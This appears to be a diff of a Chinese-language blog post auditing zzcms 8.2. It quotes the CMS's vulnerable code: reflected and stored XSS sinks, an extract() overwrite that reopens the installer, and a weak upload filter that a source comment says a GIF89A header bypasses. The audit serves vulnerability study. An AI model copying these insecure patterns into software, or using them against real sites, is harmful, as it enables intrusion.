+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"noshuiyin"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"noshuiyin"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo @$_GET['noshuiyin']?&gt;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"imgid"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"imgid"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo @$_GET['imgid']?&gt;"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>并且该文件也没有对 get 数组中的数据进行过滤，导致该处存在 xss 漏洞，不过该文件处开头部分需要验证用户登录状态，所以需要先注册一个前台用户。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/22.png" alt="22"></p>
-<p>继续看下一处 xss。看一下<code>/install/index.php</code>文件，开头部分存在 extract() 变量覆盖注册：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">...</span><br><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到<code>/install/index.php</code>文件中，并没有对<code>/install/install.lock</code>文件的存在进行验证。往下看，是一个 switch 分支，根据 step 变量的值显示每一步的安装界面。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="comment">//协议</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;   </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到每一个分支中，都会包含相应的文件，而只有在 step = 1 的分支中对<code>/install/install.lock</code>文件进行了检测。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /install/step_1.php</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">"install.lock"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div style='padding:30px;'&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>其他包含的文件中，并没有对<code>/install/install.lock</code>文件进行检测，在 step = 6 的分支中，包含了<code>/install/step_6.php</code>文件，该文件内容如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(@$step==<span class="number">6</span>)&#123;</span></span><br><span class="line"><span class="php">    fopen(<span class="string">"install.lock"</span>,<span class="string">"w"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"body"</span>&gt;</span></span><br><span class="line">	恭喜！您已经成功安装zzcms网站管理系统<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">legend</span>&gt;</span>&amp;nbsp;网站管理信息&amp;nbsp;<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">  网站后台地址：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/admin"</span>&gt;</span>/admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	管理员户名：<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $admin<span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	管理员密码： <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $adminpwdtrue<span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	非常感谢选择zzcms产品<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	更多产品相关信息，敬请关注 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.zzcms.net"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>www.zzcms.net<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"登录后台"</span> <span class="attr">onclick</span>=<span class="string">"window.location='/admin';"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"网站首页"</span> <span class="attr">onclick</span>=<span class="string">"window.location='../index.php';"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>继续看下一处 xss。看一下<code>/install/index.php</code>文件，开头部分存在 extract() 变量覆盖注册：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">...</span><br><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>/install/index.php</code>文件中，并没有对<code>/install/install.lock</code>文件的存在进行验证。往下看，是一个 switch 分支，根据 step 变量的值显示每一步的安装界面。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="comment">//协议</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;   </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到每一个分支中，都会包含相应的文件，而只有在 step = 1 的分支中对<code>/install/install.lock</code>文件进行了检测。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /install/step_1.php</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">"install.lock"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div style='padding:30px;'&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他包含的文件中，并没有对<code>/install/install.lock</code>文件进行检测，在 step = 6 的分支中，包含了<code>/install/step_6.php</code>文件，该文件内容如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(@$step==<span class="number">6</span>)&#123;</span></span><br><span class="line"><span class="php">    fopen(<span class="string">"install.lock"</span>,<span class="string">"w"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"body"</span>&gt;</span></span><br><span class="line">	恭喜！您已经成功安装zzcms网站管理系统<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">legend</span>&gt;</span>&amp;nbsp;网站管理信息&amp;nbsp;<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">  网站后台地址：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/admin"</span>&gt;</span>/admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	管理员户名：<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $admin<span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	管理员密码： <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $adminpwdtrue<span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	非常感谢选择zzcms产品<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	更多产品相关信息，敬请关注 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.zzcms.net"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>www.zzcms.net<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"登录后台"</span> <span class="attr">onclick</span>=<span class="string">"window.location='/admin';"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"网站首页"</span> <span class="attr">onclick</span>=<span class="string">"window.location='../index.php';"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>可以看到部分 php 代码输出到了 html 代码中，而在<code>/install/index.php</code>文件中并没有对 extract() 注册的变量进行很好地过滤。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/23.png" alt="23"></p>
-<p>还有一个 xss 是存储型 xss，存在问题的文件是<code>/zx/show.php</code>。<br>该文件在开头会在 zzcms_zx 表中查询数据，如果没有数据就会调用 showmsg() 函数终止代码执行。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]))&#123;</span><br><span class="line">    $zxid=$_GET[<span class="string">"id"</span>];</span><br><span class="line">    checkid($zxid);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $zxid=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql=<span class="string">"select * from zzcms_zx where id='$zxid'"</span>;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=fetch_array($rs);</span><br><span class="line"><span class="keyword">if</span> (!$row)&#123;</span><br><span class="line">    showmsg(<span class="string">'不存在相关信息！'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="comment">// 初始化变量</span></span><br></pre></td></tr></table></figure></p>
+<p>还有一个 xss 是存储型 xss，存在问题的文件是<code>/zx/show.php</code>。
+该文件在开头会在 zzcms_zx 表中查询数据，如果没有数据就会调用 showmsg() 函数终止代码执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]))&#123;</span><br><span class="line">    $zxid=$_GET[<span class="string">"id"</span>];</span><br><span class="line">    checkid($zxid);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $zxid=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql=<span class="string">"select * from zzcms_zx where id='$zxid'"</span>;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=fetch_array($rs);</span><br><span class="line"><span class="keyword">if</span> (!$row)&#123;</span><br><span class="line">    showmsg(<span class="string">'不存在相关信息！'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="comment">// 初始化变量</span></span><br></pre></td></tr></table></figure>
+
 <p>在<code>/user/zxsave.php</code>文件中，会对 zzcms_zx 表进行操作。先注册一个前台用户，并用网站管理员身份登录后台，在后台审核注册的前台用户。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/24.png" alt="24"></p>
 <p>看一下<code>/user/zxsave.php</code>中对 zzcms_zx 表的相应操作：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">"action"</span>]==<span class="string">"add"</span>)&#123;</span><br><span class="line">    $isok=query(<span class="string">"Insert into zzcms_zx(bigclassid,bigclassname,smallclassid,smallclassname,title,link,laiyuan,keywords,description,groupid,jifen,content,img,editor,sendtime) values('$bigclassid','$bigclassname','$smallclassid','$smallclassname','$title','$link','$laiyuan','$keywords','$description','$groupid','$jifen','$content','$img','$editor','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"')"</span>);  </span><br><span class="line">    $id=insert_id();</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($_POST[<span class="string">"action"</span>]==<span class="string">"modify"</span>)&#123;</span><br><span class="line">    $isok=query(<span class="string">"update zzcms_zx set bigclassid='$bigclassid',bigclassname='$bigclassname',smallclassid='$smallclassid',smallclassname='$smallclassname',title='$title',link='$link',laiyuan='$laiyuan',keywords='$keywords',description='$description',groupid='$groupid',jifen='$jifen',content='$content',img='$img',editor='$editor',sendtime='"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"',passed=0 where id='$id'"</span>);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>当 action 为 add 或者 modify 时，都会对 zzcms_zx 表进行相应操作，而这两个表单分别在<code>/user/zxadd.php</code>和<code>/user/zxmodify.php</code>文件中。<br>看一下<code>/user/zxsave.php</code>文件如何对提交上来的数据进行处理。在该文件开头包含了<code>/inc/conn.php</code>文件，其中又包含了<code>/inc/stopsqlin.php</code>文件，和上面对 gpc 中数据的过滤方式一样。<br>我们先在<code>/user/zxadd.php</code>页面中往 zzcms_zx 表中插入数据。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/25.png" alt="25"></p>
 <p>可以看到相应字符被转义和实体化了：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/26.png" alt="26"></p>
 <p>在<code>/zx/show.php</code>页面中，会将我们存入的数据进行展示，这里存入的第一条数据的 id 字段是1，所以我们访问<code>/zx/show.php?id=1</code>。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/27.png" alt="27"></p>
-<p>再看一下<code>/zx/show.php</code>中对 zzcms_zx 数据的处理：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 40</span></span><br><span class="line">$content=stripfxg($row[<span class="string">"content"</span>],<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p>
-<p>该处取出的 content 内容调用了 stripfxg() 方法，跟进看一下该方法，定义在<code>/inc/function.php</code>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripfxg</span><span class="params">($string,$htmlspecialchars_decode=false,$nl2br=false)</span> </span>&#123;<span class="comment">//去反斜杠 </span></span><br><span class="line">    $string=stripslashes($string);<span class="comment">//去反斜杠,不开get_magic_quotes_gpc 的情况下，在stopsqlin中都加上了，这里要去了</span></span><br><span class="line"><span class="keyword">if</span> ($htmlspecialchars_decode==<span class="keyword">true</span>)&#123;</span><br><span class="line">    $string=htmlspecialchars_decode($string);<span class="comment">//转html实体符号</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($nl2br==<span class="keyword">true</span>)&#123;</span><br><span class="line">    $string=nl2br($string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>再看一下<code>/zx/show.php</code>中对 zzcms_zx 数据的处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 40</span></span><br><span class="line">$content=stripfxg($row[<span class="string">"content"</span>],<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>该处取出的 content 内容调用了 stripfxg() 方法，跟进看一下该方法，定义在<code>/inc/function.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripfxg</span><span class="params">($string,$htmlspecialchars_decode=false,$nl2br=false)</span> </span>&#123;<span class="comment">//去反斜杠 </span></span><br><span class="line">    $string=stripslashes($string);<span class="comment">//去反斜杠,不开get_magic_quotes_gpc 的情况下，在stopsqlin中都加上了，这里要去了</span></span><br><span class="line"><span class="keyword">if</span> ($htmlspecialchars_decode==<span class="keyword">true</span>)&#123;</span><br><span class="line">    $string=htmlspecialchars_decode($string);<span class="comment">//转html实体符号</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($nl2br==<span class="keyword">true</span>)&#123;</span><br><span class="line">    $string=nl2br($string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>对前面转义和实体化的数据进行了还原。<br>之后的<code>/zx/show.php</code>中没有对 content 进行其他安全操作，直到结尾调用模板文件，并将 content 写入相应位置。所以这里存在 xss 漏洞。<br>我们先添加一条资讯：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/28.png" alt="28"></p>
 <p>访问该资讯的展示页：</p>
@@ -480,27 +285,52 @@
 <p>即可触发 xss 漏洞。</p>
 <h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>在<code>/uploadimg_form.php</code>页面中提供了文件上传功能：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/30.png" alt="30"></p>
-<p>该页面的文件上传的表单提交到<code>/uploadimg.php</code>中：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// /uploadimg_form.php line 61</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"uploadimg.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">onSubmit</span>=<span class="string">"return mysub()"</span> <span class="attr">style</span>=<span class="string">"padding:10px"</span> <span class="attr">target</span>=<span class="string">"doaction"</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"g_fu_image[]"</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p>
-<p>看一下<code>/uploadimg.php</code>是如何处理的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 9</span></span><br><span class="line"><span class="comment">//上传图片的类--------------------------------------------------------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//是否存在文件</span></span><br><span class="line">        <span class="keyword">if</span> (!is_uploaded_file(@<span class="keyword">$this</span>-&gt;fileName[tmp_name]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;"</span>; <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//检查文件大小</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;max_file_size*<span class="number">1024</span> &lt; <span class="keyword">$this</span>-&gt;fileName[<span class="string">"size"</span>])&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('文件大小超过了限制！最大只能上传 "</span>.<span class="keyword">$this</span>-&gt;max_file_size.<span class="string">" K的文件');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//检查文件类型//这种通过在文件头加GIF89A，可骗过</span></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"type"</span>], <span class="keyword">$this</span>-&gt;uptypes)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('文件类型错误，支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//检查文件后缀</span></span><br><span class="line">        $hzm=strtolower(substr(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"name"</span>],strpos(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"name"</span>],<span class="string">"."</span>)));<span class="comment">//获取.后面的后缀，如可获取到.php.gif</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($hzm,<span class="string">"php"</span>)!==<span class="keyword">false</span> || strpos($hzm,<span class="string">"asp"</span>)!==<span class="keyword">false</span> ||strpos($hzm,<span class="string">"jsp"</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$hzm.<span class="string">"，这种文件不允许上传');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
